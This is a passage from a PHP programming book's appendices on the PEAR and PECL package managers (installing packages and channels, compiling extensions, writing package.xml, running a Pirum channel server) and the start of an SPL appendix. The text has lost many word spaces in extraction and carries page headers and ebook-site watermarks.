andXML_Serializer .Additionally ,there isanoptional dependency ,PHP_Compat-
Info .
Second, because ofthedefault settings, thePEAR installer will refuse toinstall
anything lessthan stable. TheXML_Serializer package isbeta (seethesection called
“Package Versioning” ).Toinstall it,wecaneither change oursettings, ormanually
install it.
Toreview ourconfiguration, weusetheconfig-show command. Tochange it,we
usetheconfig-set command likeso:
$ pear config-set preferred_state beta
config-set succeeded
Or,wecaninstall thepackage byhand:
$ pear install XML_Serializer-beta
downloading XML_Serializer-0.20.2.tgz ...
Starting to download XML_Serializer-0.20.2.tgz (35,634 bytes)
.....done: 35,634 bytes
downloading XML_Parser-1.3.4.tgz ...
Starting to download XML_Parser-1.3.4.tgz (16,040 bytes)
...done: 16,040 bytes
install ok: channel://pear.php.net/XML_Parser-1.3.4
install ok: channel://pear.php.net/XML_Serializer-0.20.2
Asyoucansee,thisalso installs theXML_Parser dependency .
Now wehave thisissue resolved, let’strytoinstall PEAR_PackageFileManager2
again; thistime, we’ll include alloptional dependencies:
pear install --alldeps PEAR_PackageFileManager2
Unknown remote channel: pear.phpunit.de
pear/PHP_CompatInfo can optionally use package "channel:// ➥
  pear.phpunit.de/PHPUnit" (version >= 3.2.0)
downloading PEAR_PackageFileManager2-1.0.2.tgz ...
Starting to download PEAR_PackageFileManager2-1.0.2.tgz ➥
  (43,251 bytes)
............done: 43,251 bytes
downloading PEAR_PackageFileManager_Plugins-1.0.2.tgz ...
…319 Appendix A: PEAR and PECL
www.it-ebooks.info
install ok: channel://pear.php.net/PEAR_PackageFileManager ➥
  _Plugins-1.0.2
install ok: channel://pear.php.net/Console_Table-1.1.4
install ok: channel://pear.php.net/Console_Getargs-1.3.5
install ok: channel://pear.php.net/File_Find-1.3.1
install ok: channel://pear.php.net/Event_Dispatcher-1.1.0
install ok: channel://pear.php.net/XML_Beautifier-1.2.2
install ok: channel://pear.php.net/Console_ProgressBar-0.5.2beta
install ok: channel://pear.php.net/Var_Dump-1.0.4
install ok: channel://pear.php.net/Console_Color-1.0.3
install ok: channel://pear.php.net/HTML_Common-1.2.5
install ok: channel://pear.php.net/PEAR_PackageFileManager2-1.0.2
install ok: channel://pear.php.net/PHP_CompatInfo-1.9.0
install ok: channel://pear.php.net/HTML_Table-1.8.3
This time, awhole bunch ofpackages were installed successfully .Wecanfind this
code inthedirectory specified bythephp_dir inourpear configuration.
Butwhat’ sthisunknown remote channel ?What does thateven mean? PEAR
channels—introduced over sixyears ago—offer away tosetupyour own package
server ,aswell asuseother people’ spackage servers. Forexample, theSymfony ,
PHPUnit, Twig, Horde, Phing, andAmazon WebServices projects allprovide their
packages forinstall viaapear channel. PEAR packages candepend onpackages
from other channels.
PEAR Channels
Touseachannel, wemust first tellthepear command about it:
$ pear channel-discover pear.phpunit.de
Adding Channel "pear.phpunit.de" succeeded
Discovery of channel "pear.phpunit.de" succeeded
Ifwethen runthechannel-info command, it’lltelluseverything weneed toknow
about thechannel:
$ pear channel-info pear.phpunit.de
Channel pear.phpunit.de Information:
====================================
Name and Server         pear.phpunit.de
Alias                   phpunit
Summary                 PHPUnit PEAR ChannelPHP Master: W rite Cutting-edge Code 320
www.it-ebooks.info
Validation Package Name PEAR_Validate
Validation Package      default
Version
Server Capabilities
===================
Type Version/REST type Function Name/REST base
rest REST1.0           http://pear.phpunit.de/rest/
rest REST1.1           http://pear.phpunit.de/rest/
rest REST1.2           http://pear.phpunit.de/rest/
rest REST1.3           http://pear.phpunit.de/rest/
Themost useful partofthisistheAlias ,inthiscasephpunit .Youcanusephpunit
inplace ofthechannel URL inanycommand thattakes achannel asanargument,
orwhen specifying package names.
Packages candepend onother packages onother channels. Consequently ,wecan
tellthepear command toautomatically discover thechannels thedependencies
liveonbysetting theauto_discover setting to1:
$ pear config-set auto_discover 1
config-set succeeded
Now thatwe’ve done this, wecanseethepackages thephpunit channel offers, and
install them:
$ pear list-all -c phpunit
All packages [Channel phpunit]:
===============================
Package                    Latest Local
phpunit/bytekit            1.1.1        A command-line tool built ➥
                                          on the PHP Bytekit ➥
                                          extension.
phpunit/DbUnit             1.0.2        DbUnit port for PHP/PHPUnit.
phpunit/File_Iterator      1.2.6        FilterIterator ➥
                                          implementation that ➥
                                          filters files based ➥ 
                                          on a list of ➥
                                          suffixes.
phpunit/Object_Freezer     1.0.0        Library that faciliates ➥
                                          PHP object stores.
phpunit/phpcpd             1.3.2        Copy/Paste Detector (CPD) ➥
                                          for PHP code.321 Appendix A: PEAR and PECL
www.it-ebooks.info
phpunit/phpdcd             0.9.2        Dead Code Detector (DCD) ➥
                                          for PHP code.
phpunit/phploc             1.6.1        A tool for quickly ➥
                                          measuring the size ➥
                                          of a PHP project.
phpunit/phpUnderControl    0.5.0        CruiseControl addon for PHP
phpunit/PHPUnit            3.5.14       Regression testing ➥
                                          framework for unit tests.
phpunit/PHPUnit_MockObject 1.0.9        Mock Object library for ➥
                                          PHPUnit
phpunit/PHPUnit_Selenium   1.0.3        Selenium RC integration ➥
                                          for PHPUnit
phpunit/PHP_CodeBrowser    1.0.0        PHP_CodeBrowser for ➥
                                          integration in Hudson ➥
                                          and CruiseControl
phpunit/PHP_CodeCoverage   1.0.4        Library that provides ➥
                                          collection, processing, ➥
                                          and rendering ➥
                                          functionality ➥
                                          for PHP code coverage ➥
                                          information.
phpunit/PHP_Timer          1.0.0        Utility class for timing
phpunit/PHP_TokenStream    1.0.1        Wrapper around PHP's ➥
                                          tokenizer extension.
phpunit/ppw                1.0.4        PHP Project Wizard (PPW)
phpunit/test_helpers       1.1.0        An extension for the PHP ➥
                                          Interpreter to ease ➥
                                          testing of PHP code.
phpunit/Text_Template      1.1.0        Simple template engine.
Notice how allthepackages areprepended withphpunit/ ?This isthechannel
alias andthepackage namespace, anditallows ustodisambiguate between similarly
named packages onseparate channels.
Wecanfind more information about apackage byusing theremote-info command:
$ pear remote-info phpunit/PHPUnit
Package details:
================
Latest      3.5.14
Installed   - no -
Package     PHPUnit
License     BSD License
Category    DefaultPHP Master: W rite Cutting-edge Code 322
www.it-ebooks.info
Summary     Regression testing framework for unit tests.
Description PHPUnit is a regression testing framework used
            by the developer who implements unit tests in
            PHP. This is the version to be used with PHP 5.
Now let’sinstall thephpunit/PHPUnit package:
pear install phpunit/PHPUnit
Attempting to discover channel "pear.symfony-project.com"...
downloading channel.xml ...
Starting to download channel.xml (865 bytes)
....done: 865 bytes
Auto-discovered channel "pear.symfony-project.com", alias ➥
   "symfony", adding to registry
Attempting to discover channel "components.ez.no"...
downloading channel.xml ...
Starting to download channel.xml (591 bytes)
...done: 591 bytes
Auto-discovered channel "components.ez.no", alias "ezc", adding ➥
  to registry
Did not download optional dependencies: channel:// ➥
  components.ez.no/ConsoleTools, use --alldeps to download ➥
  automatically
phpunit/PHPUnit can optionally use PHP extension "dbus"
downloading PHPUnit-3.5.14.tgz ...
Starting to download PHPUnit-3.5.14.tgz (118,697 bytes)
...done: 118,697 bytes
…
install ok: channel://pear.symfony-project.com/YAML-1.0.6
install ok: channel://components.ez.no/Base-1.8
install ok: channel://pear.phpunit.de/DbUnit-1.0.2
install ok: channel://components.ez.no/ConsoleTools-1.6.1
install ok: channel://pear.phpunit.de/PHP_TokenStream-1.0.1
install ok: channel://pear.phpunit.de/PHP_CodeCoverage-1.0.4
install ok: channel://pear.phpunit.de/PHPUnit-3.5.14
Asyoucanseehere, weautomatically discovered both theSymfony andezCompon-
ents channels, andinstalled dependencies from both alongside those from the
phpunit channel.
Channels areanother significant feature ofPEAR; they provide theability tohandle
your own code distribution, deployment, anddependencies with aprivate channel,323 Appendix A: PEAR and PECL
www.it-ebooks.info
andwith theease ofcross-channel dependencies, youcaneven include third-party
code.
Using PEAR Code
Toutilize PEAR code, firstyoumust understand how it’sstructured. You’ve probably
runinto thisstructure—perhaps youeven already useit.
ThePEAR naming scheme isconsidered adefacto standard forPHP.That’ snotto
sayit’stheonly standard, butitcertainly hasthemost traction. Ifyouhadtolearn
onestandard, thisistheoneyou’d want. ThePEAR standard hasbeen taken upby
many other projects including PHPUnit, Zend Framework, eZComponents,1and
Horde.
Thenaming scheme iseasy: underscores =directories. That is,aclass named
PEAR_PackageFileManager2 canbefound inthe
installdir/PEAR/PackageFileManager2.php file.TousePEAR inyour project, simply
include thephp_dir inyourinclude_path ,andthen youcaninclude itinyour
code:
require_once 'PEAR/PackageFileManager2.php';
$pfm = new PEAR_PackageFileManager2(…);
// Use the class here
This simple rule also makes iteasy toautoload theclasses:
function __autoload($class_name)
{
  $class_path = str_replace('_', DIRECTORY_SEPARATOR, $class_name) ➥
    . '.php';
  require_once $class_path;
}
Installing Extensions
Soinstalling PEAR packages iseasy,butwhat about extensions? Mostly ,justas
easy:
1http://ezcomponents.org/PHP Master: W rite Cutting-edge Code 324
www.it-ebooks.info
$ pear install xdebug
No releases available for package "pear.php.net/xdebug" - 
package pecl/xdebug can be installed with "pecl install xdebug"
install failed
Trying tousethepear command fails, however; thisisbecause wemust usethe
pecl command instead. This command isfunctionally identical tothepear command
inalmost every way:
$ pecl install xhprof
downloading xhprof-0.9.2.tgz ...
Starting to download xhprof-0.9.2.tgz (931,660 bytes)
...........................................................
...........................................................
...done: 931,660 bytes
11 source files, building
running: phpize
Configuring for:
⋮
Asyoucansee,thisgrabs thePECL package, andstarts tocompile itforyou. Once
thecompilation isdone, you’ll seeamessage likethis:
Build process completed successfully
Installing '/usr/lib/php/extensions/no-debug-non-zts-20090626/ ➥
  xhprof.so'
install ok: channel://pecl.php.net/xhprof-0.9.2
configuration option "php_ini" is not set to php.ini location
You should add "extension=xhprof.so" to php.ini
This indicates thattheextension itself wasinstalled tothedirectory (onoursystem,
thismay differ onyours): /usr/lib/php/extensions/no-debug-non-zts-20090626 .This
isthedirectory thatshould besetastheextension_dir inyour php.ini .
Should youseethelasttwolines, andyouwant thepecl command toautomatically
update your php.ini filewith therequiredextension= line, youcantellitthelocation
ofyour php.ini filebyrunning:
$ pecl config-set php_ini /path/to/php.ini
config-set succeeded325 Appendix A: PEAR and PECL
www.it-ebooks.info
Compiling Extensions by Hand
There might come atime when youwant toinstall anextension either from PECL,
orfrom other sources (such asonedistributed with PHP itself) byhand. This is
quite easily accomplished. Todothis, firstdownload thepackage byhand from the
PECL website:2
$ wget http://pecl.php.net/get/xdebug 
--2011-07-31 04:05:00--  http://pecl.php.net/get/xdebug
Resolving pecl.php.net... 76.75.200.106
Connecting to pecl.php.net|76.75.200.106|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 304229 (297K) [application/octet-stream]
Saving to: `xdebug'
100%[======================================================
===========================================================
=================================================>] 304,229
400K/s   in 0.7s    
2011-07-31 04:05:01 (400 KB/s) - 'xdebug' saved 
[304229/304229]
Ifyoudon’t want touseWget (oratoolsuch ascURL), justdownload thefilein
your browser .
Next, unpack thefilethatisagzipped tarball. Wedothisusing thetarcommand,
with thefollowing flags:
■-z:uncompress with gzip first
■-x:unpack thefiles
■-v:show thefilenames asthey areunpacked
■-f xdebug :specify thefilename tounpack (inthiscase,xdebug )
$ tar -zxvf xdebug
…
2http://pecl.php.net/PHP Master: W rite Cutting-edge Code 326
www.it-ebooks.info
Once thisisdone, wemust locate thesources. Formost packages, these arefound
inthetop-level directory .Others—such asXHProf—place them inasubdirectory .
Once we’ve located thesources, wemust begin theprocess ofcompiling.
This process hasfivesteps:
1.Setupthesources forcompilation withphpize .
2.Configure thecompilation withconfigure .
3.Compile thecode withmake .
4.Install thecode withmake install .
5.Enable theextension inyour php.ini .
We’llwalk through each ofthese with Xdebug:
$ cd xdebug-2.1.2
$ phpize
Configuring for:
PHP Api Version:         20090626
Zend Module Api No:      20090626
Zend Extension Api No:   220090626
These numbers indicate theprecise versions ofPHP thatwe’re configuring for.PHP
hasaninternal APIwhich does not(intheory) change between PHP versions. As
wecansee,thecurrent version isfrom 2009.
Next, wemust configure thecompile. Wedothisbycallingconfigure andsupplying
the--enable-xdebug flag. Each extension will have itsown flags; youcanuse
configure --help tocheck what isappropriate:
$ ./configure --enable-xdebug
checking for grep that handles long lines and -e... /usr/bin/grep
checking for egrep... /usr/bin/grep -E
checking for a sed that does not truncate output... /usr/bin/sed
checking for cc... cc
⋮ lots more output here
creating libtool
appending configuration tag "CXX" to libtool
configure: creating ./config.status
config.status: creating config.h327 Appendix A: PEAR and PECL
www.it-ebooks.info
Theconfigure script checks thatallbuild dependencies aremet, andcreates the
“recipe” from which thecompiler command make willread, known astheMakefile .
Now let’scompile:
$ make
⋮ lots of compiler output here
---------------------------------------------------------------
Libraries have been installed in:
   /Users/davey/src/xdebug-2.1.2/modules
If you ever happen to want to link against installed libraries
in a given directory, LIBDIR, you must either use libtool, and
specify the full pathname of the library, or use the `-LLIBDIR'
flag during linking and do at least one of the following:
   - add LIBDIR to the `DYLD_LIBRARY_PATH' environment variable
     during execution
See any operating system documentation about shared libraries for
more information, such as the ld(1) and ld.so(8) manual pages.
----------------------------------------------------------------
Build complete.
Don't forget to run 'make test'.
Thelastlineindicates anoptional command wecanrun—make test —to rununit
tests. However ,thisisjustaholdover from themain PHP compile, andwill failto
work inthiscontext; ignore it.
Atthispoint, youcancopy theextension from theindicated installation directory
tothePHPextension_dir .It’sbest, however ,tohavemake dothisforyou, asthere
may bemore than asimple copy involved:
$ make install
Installing shared extensions:     
/usr/lib/php/extensions/no-debug-non-zts-20090626/
Atthispoint, youjustneed toedityour php.ini andaddtheappropriate configuration
lines. Formost extensions, thisissimply:
extension=extension_name.soPHP Master: W rite Cutting-edge Code 328
www.it-ebooks.info
However ,forsome tools likeXdebug, itmust besetupasazend_extension —these
extensions areupon theengine itself, andincluded atadifferent partoftheexecution
cycle. Inthecase ofXdebug, asaprofiler itneeds access totheengine itself totrack
information about theexecution ofyour code. These must beenabled using thefull
path ;otherwise, they won’t befound:
zend_extension=/usr/lib/php/extensions/no-debug-non-zts-20090626/ ➥
  xdebug.so
That’ sit.Obviously ,using thepecl command isfareasier ,butsometimes youjust
have togetyour hands dirty .
Knowing how todothisalsoenables youtocompile extensions from thePHP source
without having torecompile your entire PHP install. Justenter thedirectory forthe
appropriate extension— /php-version/ext/extensionname —and follow thesame process.
Creating P ackages
So,now youwant tocreate your own packages. Using thePEAR_PackageFileMan-
ager2 weinstalled earlier (you didinstall it,right?), it’saseasy aspie.This package
iscapable ofreading and(more importantly) writing PEAR package.xml files. This
filetells thepear command how topackage upacompatible tarball forrelease.
Before wegoahead andcreate one, let’sfirst seewhat it’smade of:
appendix_01/package.xml
<?xml version="1.0" encoding="UTF-8"?>
<package packagerversion="1.9.4" version="2.0" 
xmlns="http://pear.php.net/dtd/package-2.0" 
xmlns:tasks="http://pear.php.net/dtd/tasks-1.0" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xsi:schemaLocation="http://pear.php.net/dtd/tasks-1.0
    http://pear.php.net/dtd/tasks-1.0.xsd
    http://pear.php.net/dtd/package-2.0
    http://pear.php.net/dtd/package-2.0.xsd">
<name>Url_Shortener</name>
 <channel>pear.php.net</channel>
 <summary>Shorten URLs with a variety of services.</summary>
 <description>Url_Shortener will let you shorten URLs with 
Bit.ly, is.gd or Tinyurl</description>329 Appendix A: PEAR and PECL
www.it-ebooks.info
 <lead>
  <name>Davey Shafik</name>
  <user>dshafik</user>
  <email>me@daveyshafik.com</email>
  <active>yes</active>
 </lead>
 <date>2011-07-31</date>
 <time>21:51:29</time>
<version>
  <release>0.1.0</release>
  <api>0.1.0</api>
 </version>
 <stability>
  <release>alpha</release>
  <api>alpha</api>
 </stability>
 <license uri="http://creativecommons.org/licenses/by-
sa/3.0/">Creative Commons Attribution-ShareAlike 3.0 
Unported License</license>
 <notes>
This is the first release of the Url_Shortener package
 </notes>
 <contents>
  <dir baseinstalldir="Url" name="/">
   <file baseinstalldir="Url" 
md5sum="d41d8cd98f00b204e9800998ecf8427e" 
name="Shortener/Bitly.php" role="php" />
   <file baseinstalldir="Url" 
md5sum="d41d8cd98f00b204e9800998ecf8427e" 
name="Shortener/Interface.php" role="php" />
   <file baseinstalldir="Url" 
md5sum="d41d8cd98f00b204e9800998ecf8427e" 
name="Shortener/Isgd.php" role="php" />
   <file baseinstalldir="Url" 
md5sum="d41d8cd98f00b204e9800998ecf8427e" 
name="Shortener/Tinyurl.php" role="php" />
   <file baseinstalldir="Url" 
md5sum="d41d8cd98f00b204e9800998ecf8427e" 
name="Shortener.php" role="php" />
  </dir>
 </contents>
 <dependencies>
  <required>
   <php>
    <min>5.3.6</min>PHP Master: W rite Cutting-edge Code 330
www.it-ebooks.info
   </php>
   <pearinstaller>
    <min>1.4.0</min>
   </pearinstaller>
   <package>
    <name>pecl_http</name>
    <channel>pecl.php.net</channel>
    <min>1.7.0</min>
    <recommended>1.7.1</recommended>
    <providesextension>pecl_http</providesextension>
   </package>
  </required>
 </dependencies>
 <phprelease />
 <changelog>
  <release>
   <version>
    <release>0.1.0</release>
    <api>0.1.0</api>
   </version>
   <stability>
    <release>alpha</release>
    <api>alpha</api>
   </stability>
   <date>2011-07-31</date>
   <license uri="http://creativecommons.org/licenses/by-
sa/3.0/">Creative Commons Attribution-ShareAlike 3.0 
Unported License</license>
   <notes>
This is the first release of the Url_Shortener package
   </notes>
  </release>
 </changelog>
</package>
This somewhat lengthy filetells thepear command several important items:
■package name
■package channel
■version ofthepackage
■dependencies forthepackage
Italso includes thefilelist,aswell asthechangelog forallprevious releases.331 Appendix A: PEAR and PECL
www.it-ebooks.info
Togenerate thisfile,abasic script canbeused:
appendix_01/packager .php
// Include PEAR_PackageFileManager2
require_once 'PEAR/PackageFileManager2.php';
// Instantiate the class
$package = new PEAR_PackageFileManager2();
// Set some default settings
$package->setOptions(array(
  'baseinstalldir' => 'Url',
  'packagedirectory' => dirname(__FILE__) . '/Url',
));
// Set the Package Name
$package->setPackage('Url_Shortener');
// Set a package summary
$package->setSummary('Shorten URLs with a variety of services.');
// Set a lengthier description
$package->setDescription('Url_Shortener will let you shorten URLs ➥
  with Bit.ly, is.gd or Tinyurl');
// We don't have a channel yet, but a valid one is required so ➥
    just use pear.
$package->setChannel('pear.php.net');
// Set the Package version and stability
$package->setReleaseVersion('0.1.0');
$package->setReleaseStability('alpha');
// Set the API version and stability
$package->setApiVersion('0.1.0');
$package->setApiStability('alpha');
// Add Release Notes
$package->setNotes('This is the first release of the Url_Shortener ➥
  package');
// Set the package type (This is a PEAR-style PHP package)
$package->setPackageType('php');PHP Master: W rite Cutting-edge Code 332
www.it-ebooks.info
// Add a release section
$package->addRelease();
// Add the pecl_http extension as a dependency
$package->addPackageDepWithChannel('required', 'pecl_http', ➥
  'pecl.php.net', '1.7.0', false, '1.7.1', false, 'pecl_http');
// Add a maintainer
$package->addMaintainer('lead', 'dshafik', 'Davey Shafik', ➥
  'me@daveyshafik.com');
// Set the minimum PHP version on which the code will run
$package->setPhpDep('5.3.6');
// Set the minimum PEAR install requirement
$package->setPearinstallerDep('1.4.0');
// Add a license
$package->setLicense('Creative Commons Attribution-ShareAlike 3.0 ➥
  Unported License', 'http://creativecommons.org/licenses/ ➥
  by-sa/3.0/');
// Generate the File list
$package->generateContents(); 
// Write the XML to file
$package->writePackageFile();
Themost important lines here (and theones youwill bemodifying onaregular
basis) arethecalls tosetReleaseVersion() andsetNotes() —by updating these,
andrerunning thescript, youwill update thepackage.xml foranew release.
Thefunction calls toknow are:
■setPackage() ,which setsthepackage name
■setReleaseVersion() ,which setsthecurrent release version
■setReleaseStability() ,which setstherelease stability (dev,alpha, beta, stable)
■setNotes() ,which setsthechangelog notes
Thefinal step iscalling thepear package command, which will create theactual
release package:333 Appendix A: PEAR and PECL
www.it-ebooks.info
$ pear package Url/package.xml 
Analyzing Shortener/Bitly.php
Analyzing Shortener/Interface.php
Analyzing Shortener/Isgd.php
Analyzing Shortener/Tinyurl.php
Analyzing Shortener.php
Package Url_Shortener-0.1.0.tgz done
Once thisisdone, youcanhand thepackage toanyone toinstall using thepear
install command:
$ pear install Url_Shortener-0.1.0.tgz 
downloading pecl_http-1.7.1.tgz ...
Starting to download pecl_http-1.7.1.tgz (174,098 bytes)
.....................................done: 174,098 bytes
71 source files, building
running: phpize
Configuring for:
⋮
Installing '/usr/lib/php/extensions/no-debug-non-zts-20090626/ ➥
  http.so'
install ok: channel://pecl.php.net/pecl_http-1.7.1
install ok: channel://pear.php.net/Url_Shortener-0.1.0
How cool isthat? That ittybitty script, andwe’ve automated theinstallation ofour
package anditsdependencies—and notjustanydependency ,butacompiled PHP
extension!
Package V ersioning
PEAR hasavery well-defined (and again, defacto standard) versioning scheme for
packages. Apackage version hastwocomponents: theversion number ,andthe
package stability; youwill often seethisexpressed as0.2.0-dev or1.5.1-stable.
Theversion number consists ofthree parts expressed inanX.Y.Zformat: Ma-
jor.Minor .Micro. These three parts areincremented asfollows:
■Major :when backwards-incompatible changes occur
■Minor :when features areaddedPHP Master: W rite Cutting-edge Code 334
www.it-ebooks.info
■Micro :bugfix(only) releases
Inaddition tothese taxonomies, there arefour designated stability monikers:
■dev:totally broken
■alpha :stillquite broken
■beta:might bebroken
■stable :shouldn’t bebroken
Thelast(stable) isoptional inaversion number ,andisassumed when noother
moniker isspecified. Asamatter ofnote, there isafifth state: RC,which stands for
Release Candidate—a version with thepotential tobeafinal product, butwhich
may stillhave afewbugs. RCstatus canbeachieved bysetting abeta state andap-
pending RCandasequential number totheversion number ,such as1.0.0RC1 .
This isallbestillustrated with anexample, solet’stake alook atourUrl_Shortener
inthiscontext:
0.1.0-dev
theinitial release
0.2.0-dev
stillfairly broken, butchange isdefinitely happening
0.2.1-dev
fixed abugandpushed itout
0.3.0-alpha
thepackage isnow unlikely tobreak backwards compatibility
0.4.0-beta
thepackage isnow quite stable, butthere’ sstillasmall percentage ofbackwards-
incompatible changes
1.0.0RC1
thepackage isnow very unlikely tobreak backwards compatibility
1.0.0RC2
acritical bugwasfound inRC1andfixed335 Appendix A: PEAR and PECL
www.it-ebooks.info
1.0.0
thepackage isnow stable, andbackwards-incompatible changes arenolonger
allowed
1.0.1
bugfixrelease
1.1.0
new features added
2.0.0-dev
abackwards-incompatible change wasadded andwestart over again …
Asyoucansee,adhering tothisversion scheme makes releases predictable, and
also gives consumers theability tointelligently figure outwhat anew package ver-
sion might entail.
Creating a Channel
Sonow youhave abunch ofcool packages, andyouwant todistribute them toyour
adoring fans: it’stime tosetupyour own PEAR channel server .This ismuch easier
than itmight seem, thanks totheefforts ofthePirum Project .Pirum isasimple
(static) channel server ,available (predictably) viathePirum PEAR channel.
First, let’sinstall Pirum:
$ pear channel-discover pear.pirum-project.org
Adding Channel "pear.pirum-project.org" succeeded
Discovery of channel "pear.pirum-project.org" succeeded
$ pear install pirum/Pirum
downloading Pirum-1.0.2.tgz ...
Starting to download Pirum-1.0.2.tgz (12,538 bytes)
.....done: 12,538 bytes
install ok: channel://pear.pirum-project.org/Pirum-1.0.2
Next, testyour install byrunning thepirum command:
$ pirum 
Pirum 1.0.2 by Fabien Potencier
Available commands:PHP Master: W rite Cutting-edge Code 336
www.it-ebooks.info
  pirum build target_dir
  pirum add target_dir Pirum-1.0.0.tgz
  pirum remove target_dir Pirum-1.0.0.tgz
Once wehave this, wemust create apirum.xml file,andthisfilemust reside inthe
rootofyour channel directory .The pirum.xml fileissimple, containing thechannel
name, alias, abrief description, andthechannel URL. Forexample, ifwewant to
create alocal testing channel server atpear.local ,wecanusethefollowing:
<?xml version="1.0" encoding="UTF-8" ?>
<server>
  <name>pear.local</name>
  <summary>My Local PEAR channel</summary>
  <alias>local</alias>
  <url>http://pear.local/</url>
</server>
We’llplace thisfileinthe/Librar y/WebSer ver/Documents/pear .local directory .
Now justcallthebuild command, andPirum willcreate ourchannel server ,includ-
ingafriendly HTML page from which users cangain anoverview ofthechannel
anditspackages:
$ pirum build /Library/WebServer/Documents/pear.local
Pirum 1.0.2 by Fabien Potencier
Available commands:
  pirum build target_dir
  pirum add target_dir Pirum-1.0.0.tgz
  pirum remove target_dir Pirum-1.0.0.tgz
Running the build command:
   INFO   Building channel
   INFO   Building maintainers
   INFO   Building categories
   INFO   Building packages
   INFO   Building releases
   INFO   Building index
   INFO   Building feed
   INFO   Updating PEAR server files
   INFO   Command build run successfully337 Appendix A: PEAR and PECL
www.it-ebooks.info
Ifyounow look inside thepear.local directory ,you’ll seeanumber offiles necessary
forthepear command tousetointeract with theserver .Themost important of
these files ischannel.xml ,which iswhat thepear command will retrieve tounder -
stand thecapabilities ofthechannel server .
Allweneed todonow issetupasimple VirtualHost, andwe’re ready togo:
<VirtualHost *:80>
        ServerName pear.local
        DocumentRoot /Library/WebServer/Documents/pear.local
</VirtualHost>
Tocheck outwhat Pirum hasdone forus,load pear.local inyour favorite browser ,
andyou’ll seeapage similar toFigure A.1.
Figur e A.1. Setting up your PEAR channel using Pirum is easy
Asanobservant individual, I’msure younoticed thatthere arenopackages listed.
Toaddapackage, wemust firstrepackage itforourchannel. Todothis, PEAR must
discover thechannel:PHP Master: W rite Cutting-edge Code 338
www.it-ebooks.info
$ pear channel-discover pear.local
Adding Channel "pear.local" succeeded
Discovery of channel "pear.local" succeeded
Youcanseeourchannel isworking justfine! Let’srecreate ourpackage. First, we
have toupdate ourpackager .php script andchange thefollowing:
$package->setChannel('pear.php.net');
// becomes:
$package->setChannel('pear.local');
Next, runthepackager again:
$ php packager.php 
Analyzing Shortener/Bitly.php
Analyzing Shortener/Interface.php
Analyzing Shortener/Isgd.php
Analyzing Shortener/Tinyurl.php
Analyzing Shortener.php
And finally ,package thenew version:
$ pear package Url/package.xml 
Analyzing Shortener/Bitly.php
Analyzing Shortener/Interface.php
Analyzing Shortener/Isgd.php
Analyzing Shortener/Tinyurl.php
Analyzing Shortener.php
Package Url_Shortener-0.2.0.tgz done
Now thatwehave ournew package, let’saddittoourPEAR channel using the
pirum add command:
$ pirum add ./ /path/to/Url_Shortener-0.2.0.tgz 
Pirum 1.0.2 by Fabien Potencier
Available commands:
  pirum build target_dir
  pirum add target_dir Pirum-1.0.0.tgz
  pirum remove target_dir Pirum-1.0.0.tgz
Running the add command:
   INFO   Parsing package 0.2.0 for Url_Shortener339 Appendix A: PEAR and PECL
www.it-ebooks.info
   INFO   Building channel
   INFO   Building maintainers
   INFO   Building categories
   INFO   Building packages
   INFO   Building package Url_Shortener
   INFO   Building releases
   INFO   Building releases for Url_Shortener
   INFO   Building release 0.2.0 for Url_Shortener
   INFO   Building index
   INFO   Building feed
   INFO   Updating PEAR server files
   INFO   Command add run successfully
Now ifwequery ourchannel forpackages, we’ll seeournew package listed inall
itsglory: Wecannow uninstall ouroriginal package (otherwise we’ll getfilecon-
flicts!), andinstall ournew custom channel-based package:
$ pear uninstall Url_Shortener
uninstall ok: channel://pear.php.net/Url_Shortener-0.1.0
And finally ,weinstall ournew package:
$ pear install local/Url_Shortener-alpha
downloading Url_Shortener-0.2.0.tgz ...
Starting to download Url_Shortener-0.2.0.tgz (1,084 bytes)
....done: 1,084 bytes
install ok: channel://pear.local/Url_Shortener-0.2.0
Congratulations—you now have afully functioning PEAR channel!
Now What?
Inaddition todependency management, PEAR provides:
■role-based fileinstallation, such asbinaries (like thepear command itself), web
files, andPHP files (that arepart ofthelibrary itself)
■tasks such asupdating base paths based onthelocal PEAR configuration
■post-install scripts tohandle tasks likedatabase migrations andconfiguration
setupPHP Master: W rite Cutting-edge Code 340
www.it-ebooks.info
Furthermore, PEAR handles theconcept ofmeta-packages forsimply managing a
number ofpackages across multiple servers. Justcreate anddistribute themeta-
package, andonce it’sinstalled, itwill inturn install allthedesired packages.
PEAR isagreat addition toyour PHP arsenal, whether it’sproviding youwith easy
access tothird-party tools, orhelping youdistribute your own—and soon, with
Pyrus (aka PEAR 2)3coming down thepipeline, itwillreceive anoverhaul forPHP
5.3andbeyond. Youshould definitely check itoutforyourself!
3http://pear2.php.net/341 Appendix A: PEAR and PECL
www.it-ebooks.info
www.it-ebooks.info
Appendix B: SPL: The Standar d PHP Libr ary
SPL,theStandard PHP library—first introduced with PHP 5.0—provides many
handy features forPHP projects. You’ll remember wementioned itsprovision of
iterator interfaces inChapter 4—but thisisjustoneofitsmany useful facets.
TheStandard PHP Library isintended toprovide best ofbreed interfaces—as well
asabstract andconcrete implementations ofdesign patterns andsolutions tocommon
problems—while taking advantage ofthenew object oriented features provided in
PHP 5.
ArrayAccess  and ArrayObject
Ifyouwant tocreate anobject thatcanbeaccessed using array syntax (and isseen
asanarray forallfunctions requiring one), youcanimplement theArrayAccess
interface. This interface isfairly simple, andeasy toimplement:
appendix_02/ArrayAccess.php
class MyArray implements ArrayAccess {
  public function offsetExists($offset) {
      return isset($this->{$offset});
  }
  public function offsetGet($offset) {
    return $this->{$offset};
  }
  public function offsetSet($offset, $value) {
    $this->{$offset} = $value;
  }
  public function offsetUnset($offset) {
    unset($this->{$offset});
  }
}
$arrayObj = new MyArray();
$arrayObj['greeting'] = "Hello World";
echo $arrayObj['greeting']; // Shows "Hello World"
www.it-ebooks.info
SPL also provides aready-to-go implementation calledArrayObject :
appendix_02/ArrayObject.php
$arrayObj = new ArrayObject();
$arrayObj['greeting'] = "Hello World";
echo $arrayObj['greeting']; // Shows "Hello World"
And thisisn’t allthatArrayObject iscapable of.Ifyouneed touseanative array
within aniterator ,youcanpass itintotheArrayObject constructor ,anditwill
effectively create aniterator facade onthatarray .From thatpoint on,youcanthen
useitwith other iterators, asdescribed inChapter 4.
Autoloading
While PHP supports autoloading ofclasses viathe__autoload() function, ithasa
lotoflimitations. Specifically ,there canbejusttheoneautoloader .Ifyoutryto
mingle multiple projects thateach define an__autoload() function, you’ll receive
afatal error .Additionally ,with only oneautoloader allowed, itmust either handle
every possible filenaming convention, orbeinadequate forthetask.
SPLprovides asolution tothisproblem with astack-based autoloader mechanism.
